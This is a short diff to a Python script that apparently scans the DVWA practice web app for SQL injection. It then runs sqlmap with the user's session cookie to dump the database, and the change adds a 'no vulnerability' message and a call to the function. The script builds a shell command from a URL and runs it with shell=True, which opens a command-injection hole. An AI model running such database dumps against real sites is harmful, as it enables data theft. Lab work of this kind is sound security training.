@@ -97,7 +97,7 @@ def scanSQLInjection():
                     print("\t[✅] SQL Injection vulnerability detected, link:", res.url)
                     print('\t[i] Trying to dump database using sqlmap:')
                     print('\t\tInjection on ' + res.url)
-                    command = "sqlmap -u '" + res.url + "' --cookie='PHPSESSID=" + getDVWALogin()['PHPSESSID'] + ";security=low' --dump --batch --output-dir='dump/'"
+                    command = "sqlmap -u '" + res.url + "' --cookie='PHPSESSID=" + getDVWALogin()['PHPSESSID'] + ";security=low' --dump --batch"
                     print(command)
                     process = Popen(command, shell=True, stdout=PIPE)
                     report += res.url + " is an injectable form where we dumped this:"
@@ -114,4 +114,8 @@ def scanSQLInjection():
                             print(dump[:len(dump)-1])
                             report += dump[:len(dump)-1]
                     print('#####################################')
-                    break   
+                    break 
+                else:
+                    print("\t[❌] No vulnerability detected, link!")
+
+scanSQLInjection()
